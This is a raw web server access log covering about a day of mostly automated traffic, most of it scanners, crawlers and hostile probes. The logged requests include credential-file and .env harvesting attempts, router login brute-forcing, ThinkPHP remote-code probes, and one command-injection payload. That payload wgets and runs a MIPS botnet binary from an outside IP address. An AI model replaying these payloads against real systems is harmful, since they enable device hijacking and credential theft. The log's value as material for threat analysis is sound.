152.89.196.211 - - [01/Feb/2023:17:38:19 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
114.119.136.190 - - [01/Feb/2023:17:57:30 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
5.239.176.118 - - [01/Feb/2023:18:00:50 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
192.241.238.11 - - [01/Feb/2023:18:03:09 -0600] "GET /actuator/health HTTP/1.1" 301 256 "-" "Mozilla/5.0 zgrab/0.x"
192.241.237.21 - - [01/Feb/2023:18:03:17 -0600] "GET /portal/redlion HTTP/1.1" 301 255 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [01/Feb/2023:18:04:49 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [01/Feb/2023:18:32:27 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.177.242 - - [01/Feb/2023:18:36:03 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
5.188.210.227 - - [01/Feb/2023:18:45:48 -0600] "GET http://5.188.210.227/echo.php HTTP/1.1" 301 249 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
143.110.222.166 - - [01/Feb/2023:19:05:28 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.246.220.98 - - [01/Feb/2023:19:34:14 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
90.151.171.106 - - [01/Feb/2023:19:35:52 -0600] "CONNECT api.ipify.org:443 HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [01/Feb/2023:19:36:02 -0600] "GET http://api.ipify.org?Z71823167623Q1 HTTP/1.1" 301 256 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
151.30.207.253 - - [01/Feb/2023:19:44:33 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36"
103.203.57.7 - - [01/Feb/2023:19:53:29 -0600] "GET / HTTP/1.1" 301 241 "-" "HTTP Banner Detection (https://security.ipip.net)"
193.32.162.159 - - [01/Feb/2023:20:00:59 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.246.220.98 - - [01/Feb/2023:20:00:59 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.227.254.55 - - [01/Feb/2023:20:04:09 -0600] "\x03" 400 226 "-" "-"
45.227.254.55 - - [01/Feb/2023:20:04:09 -0600] "\x03" 400 226 "-" "-"
143.110.222.166 - - [01/Feb/2023:20:05:42 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
111.118.40.97 - - [01/Feb/2023:20:17:53 -0600] "GET /login.cgi?cli=aa%20aa%27;wget%20http://134.195.138.33/.nCKx/zx.mips%20-O%20-%3E%20/tmp/kh;/tmp/kh%20selfrep.dlink%27$ HTTP/1.1" 400 226 "-" "Hakai/2.0"
185.224.128.219 - - [01/Feb/2023:20:43:53 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
179.43.177.242 - - [01/Feb/2023:20:51:37 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
42.83.147.34 - - [01/Feb/2023:21:07:58 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
143.110.222.166 - - [01/Feb/2023:21:09:09 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
167.94.138.62 - - [01/Feb/2023:21:41:15 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
167.94.138.62 - - [01/Feb/2023:21:41:15 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.62 - - [01/Feb/2023:21:41:15 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
117.33.227.207 - - [01/Feb/2023:21:54:09 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
103.149.192.44 - - [01/Feb/2023:22:06:02 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
143.110.222.166 - - [01/Feb/2023:22:09:18 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
165.22.40.131 - - [01/Feb/2023:22:42:02 -0600] "\x16\x03\x01" 400 226 "-" "-"
165.22.40.131 - - [01/Feb/2023:22:42:03 -0600] "\x16\x03\x01" 400 226 "-" "-"
165.22.40.131 - - [01/Feb/2023:22:42:03 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.222.166 - - [01/Feb/2023:23:03:29 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
2001:470:1:c84::15 - - [01/Feb/2023:23:11:23 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
34.140.248.32 - - [01/Feb/2023:23:16:41 -0600] "GET / HTTP/1.1" 301 241 "-" "python-requests/2.28.2"
2001:470:1:c84::15 - - [01/Feb/2023:23:21:12 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
2001:470:1:c84::15 - - [01/Feb/2023:23:21:17 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42"
162.243.145.11 - - [01/Feb/2023:23:29:47 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
140.238.69.139 - - [01/Feb/2023:23:30:30 -0600] "GET /phpinfo HTTP/1.1" 301 248 "-" "-"
198.199.119.35 - - [01/Feb/2023:23:57:27 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [02/Feb/2023:00:06:30 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
64.62.197.57 - - [02/Feb/2023:00:49:13 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
64.62.197.59 - - [02/Feb/2023:00:50:12 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
64.62.197.58 - - [02/Feb/2023:00:50:26 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
104.234.119.144 - - [02/Feb/2023:00:58:23 -0600] "GET /.env HTTP/1.1" 301 245 "-" "python-requests/2.28.2"
143.110.222.166 - - [02/Feb/2023:01:05:53 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
81.161.229.94 - - [02/Feb/2023:01:32:40 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 263 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
179.43.177.242 - - [02/Feb/2023:01:50:20 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [02/Feb/2023:02:08:11 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
194.87.151.116 - - [02/Feb/2023:02:47:43 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [02/Feb/2023:03:08:26 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.35.18.203 - - [02/Feb/2023:03:29:53 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
193.35.18.206 - - [02/Feb/2023:03:47:13 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
179.43.177.242 - - [02/Feb/2023:03:49:06 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
143.110.222.166 - - [02/Feb/2023:04:03:38 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [02/Feb/2023:05:05:24 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
52.146.17.145 - - [02/Feb/2023:05:56:44 -0600] "GET /.ebextensions/ HTTP/1.1" 301 255 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
143.110.222.166 - - [02/Feb/2023:06:04:31 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.246.220.98 - - [02/Feb/2023:06:32:13 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [02/Feb/2023:07:06:15 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.219 - - [02/Feb/2023:07:21:59 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
109.237.98.226 - - [02/Feb/2023:07:24:01 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:01 -0600] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
109.237.98.226 - - [02/Feb/2023:07:24:01 -0600] "POST /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:01 -0600] "GET /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:02 -0600] "POST /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:02 -0600] "GET /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:02 -0600] "POST /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:03 -0600] "GET /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:03 -0600] "POST /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:03 -0600] "GET /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:04 -0600] "POST /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:04 -0600] "GET /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:04 -0600] "POST /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:04 -0600] "GET /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:05 -0600] "POST /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:05 -0600] "GET /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:05 -0600] "POST /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:06 -0600] "GET /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:06 -0600] "POST /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:06 -0600] "GET /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [02/Feb/2023:07:24:07 -0600] "POST /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [02/Feb/2023:08:05:31 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.79.181.179 - - [02/Feb/2023:08:26:29 -0600] "\x16\x03\x01" 400 226 "-" "-"
185.224.128.219 - - [02/Feb/2023:08:28:02 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
90.151.171.108 - - [02/Feb/2023:08:54:23 -0600] "CONNECT v4.ident.me:443 HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.108 - - [02/Feb/2023:08:54:33 -0600] "GET http://v4.ident.me?Z71823167623Q1 HTTP/1.1" 301 256 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
143.110.222.166 - - [02/Feb/2023:09:08:22 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
3.252.34.110 - - [02/Feb/2023:09:49:48 -0600] "GET / HTTP/1.0" 301 241 "-" "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
183.136.225.32 - - [02/Feb/2023:09:59:44 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
143.110.222.166 - - [02/Feb/2023:10:05:48 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
139.59.33.254 - - [02/Feb/2023:10:07:18 -0600] "\x16\x03\x01" 400 226 "-" "-"
139.59.33.254 - - [02/Feb/2023:10:07:18 -0600] "\x16\x03\x01" 400 226 "-" "-"
139.59.33.254 - - [02/Feb/2023:10:07:19 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
179.43.177.242 - - [02/Feb/2023:10:23:46 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
185.246.220.98 - - [02/Feb/2023:10:54:41 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
142.93.65.162 - - [02/Feb/2023:11:06:28 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [02/Feb/2023:11:10:48 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
5.161.189.7 - - [02/Feb/2023:11:35:28 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"
5.161.189.7 - - [02/Feb/2023:11:37:48 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"
194.38.20.161 - - [02/Feb/2023:11:50:34 -0600] "GET /sites/all/modules/plupload/plupload/examples/upload.php HTTP/1.1" 301 296 "-" "ALittle Client"
193.35.18.231 - - [02/Feb/2023:11:51:17 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
64.227.48.129 - - [02/Feb/2023:12:04:10 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
143.110.222.166 - - [02/Feb/2023:12:07:17 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [02/Feb/2023:12:09:25 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 365 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2620:96:e000:b0cc:e:2:7:2 - - [02/Feb/2023:12:19:56 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2620:96:e000:b0cc:e:2:7:2 - - [02/Feb/2023:12:19:57 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
193.32.162.159 - - [02/Feb/2023:12:26:21 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
164.92.247.127 - - [02/Feb/2023:12:36:31 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
45.9.110.186 - - [02/Feb/2023:12:42:07 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
45.9.110.186 - - [02/Feb/2023:12:42:09 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
45.9.110.186 - - [02/Feb/2023:12:42:10 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
45.9.110.186 - - [02/Feb/2023:12:42:11 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
143.110.222.166 - - [02/Feb/2023:13:04:27 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
195.201.192.44 - - [02/Feb/2023:13:06:30 -0600] "CONNECT www.google.com:443 HTTP/1.1" 301 241 "-" "Go-http-client/1.1"
152.89.196.211 - - [02/Feb/2023:13:16:00 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [02/Feb/2023:13:19:50 -0600] "GET /console/ HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [02/Feb/2023:13:28:57 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [02/Feb/2023:13:41:22 -0600] "GET /_ignition/execute-solution HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [02/Feb/2023:14:06:40 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
202.55.135.248 - - [02/Feb/2023:14:10:25 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [02/Feb/2023:14:26:32 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
205.210.31.170 - - [02/Feb/2023:14:48:22 -0600] "\x16\x03\x01" 400 226 "-" "-"
193.32.162.159 - - [02/Feb/2023:14:56:47 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
114.119.156.124 - - [02/Feb/2023:15:03:00 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
143.110.222.166 - - [02/Feb/2023:15:08:46 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
